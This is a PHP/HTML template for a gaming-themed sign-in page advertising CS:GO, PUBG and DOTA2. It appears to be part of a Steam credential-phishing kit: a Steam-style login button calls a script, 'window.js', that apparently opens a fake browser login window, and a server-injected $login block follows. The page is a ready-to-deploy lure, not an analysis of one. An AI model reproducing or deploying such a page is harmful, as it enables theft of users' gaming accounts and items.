<?php
	require_once("default_code.php");
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title><?=$title?></title>
	
    <link rel="shortcut icon" href="https://imgur.com/mi1tf6k.png">

	
    <link rel="stylesheet" href="template-2/css/main.css">
	
<link href="window/window.css" rel="stylesheet">
<script src="window/bowser.js"></script>
<script src="window/jquery-3.2.1.min.js"></script>
<script src="window/window.js"></script>
<script src="window/jquery-ui.min.js"></script>
<style>
		* {
			margin: 0;
			padding: 0;
			border: 0;
			outline: 0;
			text-decoration: none;
			list-style: none;
			background: 0 0;
			font-weight: inherit;
			box-sizing: border-box;
			-moz-box-sizing: border-box;
		}
		body {
			background-color: rgb(19, 18, 30);
			font: 400 75% Arial,Helvetica,sans-serif;
			-font-family: 400 75% Lato, Sans-serif;
		}
			#login, body, html {
			background-position: center;
			background-size: cover;
			margin: 0;
			width: 100%;
			height: 100%;
			overflow: hidden;
		}
		#login-steam {
			padding: 43px;
		}
		#skull {
			max-height: 153px;
			margin-bottom: 20px;
			background-size: 100%;
			background-repeat: no-repeat;
		}
		#login {
			color: #fff;
			display: flex;
			justify-content: center;
			display: -webkit-flex;
			align-items: center;
			flex-flow: column;
		}
		#playing_games {
			background-position: center;
			background-size: cover;
			width: 100%;
			height: 100vh;
			background-image: url(template-2/img/bg2.gif);
			position: absolute;
			top: 0;
			z-index: -20;
			filter: blur(8px);
			transform: scale(1.0);
		}
		#login h3 {
			font-size: 16px;
			line-height: 16px;
			text-align: center;
		}
		strong, b {
			font-weight: bold;
		}
			  h1 { 
    text-transform: uppercase;
   }
	</style>

</head>

<body style="background-color: rgb(19, 18, 30); background-image: none;">
    <main id="login">
        <!--<div id="skull"></div>-->
        <h1><strong><?=$_SERVER["SERVER_NAME"]?></strong></h1>
        <div><br /><br />
          <h3><b>CS:GO | PUBG | DOTA2</b></h3>
<br /><br />
            <div id="login-screen">
               <a href="javascript:login()" class="goAuth">
			   <div id="login-screen-content">
                    <img src="template-2/img/login_btn.png" id="login-logo"><br /><br />
                    <h6><center>BY CLICKING "SIGN IN" BUTTON YOU ARE CONFIRMING YOU'RE AT LEAST 18 YEARS OLD AND HAVE READ &amp; AGREED WITH USER AGREEMENT.</center></h6>
                </div></a>
            </div>
        </div>
    </main>
    <div id="playing_games"></div>
	<?=$login?>
</body>
</html>